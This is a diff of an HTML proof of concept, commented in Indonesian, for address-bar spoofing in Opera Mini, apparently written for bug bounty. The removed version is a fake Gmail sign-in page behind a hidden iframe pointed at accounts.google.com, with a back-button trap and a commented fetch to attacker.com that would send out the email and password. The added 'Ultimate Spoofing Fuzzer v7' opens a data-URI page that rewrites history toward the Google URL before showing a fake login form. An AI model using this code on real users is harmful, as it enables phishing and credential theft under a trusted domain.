@@ -1,151 +1,95 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sign in - Google Accounts</title>
-    <style>
-        /* Reset CSS agar memenuhi layar */
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Roboto', Arial, sans-serif; }
-        body, html { height: 100%; overflow: hidden; background: #fff; }
-        
-        /* Iframe tersembunyi yang akan memancing Address Bar */
-        #trigger-frame {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 10px;
-            height: 10px;
-            opacity: 0.01; /* Hampir tidak terlihat */
-            z-index: -1;
-            pointer-events: none;
-        }
-
-        /* UI Palsu yang menutupi seluruh layar */
-        #spoof-container {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #fff;
-            z-index: 999999;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            padding-top: 50px;
-        }
-
-        .logo { width: 80px; margin-bottom: 20px; }
-        .title { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
-        .subtitle { font-size: 15px; color: #202124; margin-bottom: 30px; }
-        
-        .input-group { width: 100%; max-width: 350px; padding: 0 20px; }
-        .input-box {
-            width: 100%;
-            padding: 15px;
-            font-size: 16px;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            margin-bottom: 15px;
-            outline: none;
-        }
-        .input-box:focus { border: 2px solid #1a73e8; padding: 14px; }
-
-        .button-group {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            width: 100%;
-            max-width: 350px;
-            padding: 0 20px;
-            margin-top: 10px;
-        }
-
-        .btn-next {
-            background-color: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 12px 24px;
-            border-radius: 4px;
-            font-size: 14px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        .btn-next:active { background-color: #1557b0; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ultimate Spoofing Fuzzer v7</title>
+<style>
+    body { font-family: sans-serif; padding: 15px; background: #121212; color: #fff; }
+    button { background: #d32f2f; color: white; padding: 15px; font-size: 16px; width: 100%; border: none; border-radius: 5px; font-weight: bold; margin-bottom: 10px; }
+    .log { background: #000; color: #0f0; padding: 10px; font-family: monospace; font-size: 12px; height: 150px; overflow-y: auto; border-radius: 5px;}
+</style>
 </head>
 <body>
 
-    <!-- 1. IFRAME PEMANCING (Memancing Opera Mini untuk mengubah URL Address Bar) -->
-    <!-- Kita arahkan ke URL otentikasi Google yang valid -->
-    <iframe id="trigger-frame" src="https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com" sandbox="allow-scripts allow-same-origin"></iframe>
+<h2>Ultimate Top-Level Spoofing</h2>
+<p>Fokus: Memicu Address Bar Google, lalu merender form palsu (interaktif) setelahnya.</p>
 
-    <!-- 2. UI PALSU (Yang dilihat dan diinteraksi oleh korban) -->
-    <div id="spoof-container">
-        <!-- Gambar logo Google/Gmail (bisa diganti dengan base64 agar tidak butuh request luar) -->
-        <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" class="logo" alt="Gmail">
-        
-        <div class="title">Sign in</div>
-        <div class="subtitle">to continue to Gmail</div>
+<button onclick="runTopLevelRace()">Jalankan Trik: Dynamic DOM Injection (Data URI)</button>
 
-        <div class="input-group">
-            <input type="text" id="victimEmail" class="input-box" placeholder="Email or phone" autocomplete="off">
-            <input type="password" id="victimPass" class="input-box" placeholder="Password" autocomplete="off">
-        </div>
+<div class="log" id="log">Siap...</div>
 
-        <div class="button-group">
-            <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px; font-weight: 500;">Forgot password?</a>
-            <button class="btn-next" onclick="captureCredentials()">Next</button>
-        </div>
-    </div>
+<script>
+    const logBox = document.getElementById('log');
+    function log(msg) {
+        logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
+        logBox.scrollTop = logBox.scrollHeight;
+    }
 
-    <script>
-        // --- LOGIKA EKSPLOITASI ---
+    function runTopLevelRace() {
+        log("Memulai Trik Dynamic DOM Injection...");
 
-        // 1. History Trap: Mencegah korban menekan tombol 'Back' atau 'Kembali'
-        history.pushState(null, null, location.href);
-        window.addEventListener('popstate', function () {
-            history.pushState(null, null, location.href);
-        });
+        const targetUrl = "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com";
 
-        // 2. Mencegah dialog refresh (Opsional, membuat korban terjebak lebih lama)
-        window.onbeforeunload = function() {
-            return "Data yang belum disimpan akan hilang.";
-        };
+        // 1. Buat HTML Palsu DASAR (Tanpa UI, hanya shell kosong dengan script)
+        // Kita gunakan script yang mendengarkan perubahan state
+        const fakeHtml = `
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Sign in - Google Accounts</title>
+                <style>
+                    /* Styling UI Palsu */
+                    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #fff; text-align: center; }
+                    #ui-palsu { display: none; padding-top: 50px; }
+                    input { width: 80%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; }
+                    button { padding: 12px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; }
+                </style>
+            </head>
+            <body>
+                <!-- Shell Kosong yang akan diisi setelah address bar berubah -->
+                <div id="ui-palsu">
+                    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" width="100"><br>
+                    <h2 style="font-weight:normal;">Sign in</h2>
+                    <p style="color:#555;">to continue to Gmail</p>
+                    <input type="text" id="email" placeholder="Email or phone"><br>
+                    <input type="password" id="password" placeholder="Password"><br>
+                    <button onclick="alert('DATA DICURI: ' + document.getElementById('email').value)">Next</button>
+                </div>
 
-        // 3. Fungsi Pencurian Kredensial
-        function captureCredentials() {
-            const email = document.getElementById('victimEmail').value;
-            const pass = document.getElementById('victimPass').value;
+                <script>
+                    // 2. TRIGGER: Paksa redirect ke Google untuk mengubah Address Bar
+                    setTimeout(function() {
+                        // Ubah URL tanpa memicu navigasi penuh (jika didukung)
+                        try {
+                            window.history.replaceState({}, '', '${targetUrl}');
+                        } catch(e) {
+                            // Fallback jika replaceState diblokir SOP
+                        }
+                        
+                        // 3. Tampilkan UI Palsu SETELAH Address Bar dipancing
+                        document.getElementById('ui-palsu').style.display = 'block';
+                    }, 100); // Delay 100ms untuk memberi waktu Opera Mini update Address Bar
+                    
+                    // History Trap
+                    history.pushState(null, null, location.href);
+                    window.onpopstate = function () { history.go(1); };
+                <\/script>
+            </body>
+            </html>
+        `;
 
-            if (!email || !pass) {
-                alert("Masukkan email dan password Anda.");
-                return;
-            }
+        const dataUri = "data:text/html;charset=utf-8," + encodeURIComponent(fakeHtml);
 
-            // --- SIMULASI PENGIRIMAN DATA KE ATTACKER ---
-            // Di dunia nyata, data ini dikirim ke server via fetch/XHR
-            // fetch('https://attacker.com/log?email=' + email + '&pass=' + pass);
-            
-            // Untuk keperluan BUG BOUNTY, kita tampilkan alert sebagai bukti eksekusi
-            alert("🔥 POC BERHASIL! 🔥\n\nAddress Bar menunjukkan: accounts.google.com\nTapi data ditangkap oleh Origin Attacker:\n\nEmail: " + email + "\nPassword: " + pass);
-            
-            // Setelah diambil, kita pura-pura error atau redirect ke Google asli
-            // window.location.href = "https://accounts.google.com";
+        // Buka window baru dengan Data URI
+        const w = window.open(dataUri, "_blank");
+        if (!w) {
+            log("Gagal membuka popup. Cek pengaturan browser.");
+            return;
         }
 
-        // 4. Trik Memaksa UI Tetap Hidup Saat Address Bar Berubah
-        // Opera Mini kadang nge-freeze halaman saat iframe selesai loading.
-        // Kita gunakan interval untuk memastikan UI kita selalu di atas.
-        setInterval(function() {
-            const container = document.getElementById('spoof-container');
-            if (container.style.display === 'none' || !container.parentNode) {
-                // Jika Opera Mini mencoba menghapus UI kita, kita paksa muncul lagi
-                document.body.appendChild(container);
-                container.style.display = 'flex';
-            }
-        }, 100);
-    </script>
+        log("Data URI dibuka. Jika address bar berubah jadi Google, UI akan muncul di bawahnya.");
+    }
+</script>
 </body>
 </html>
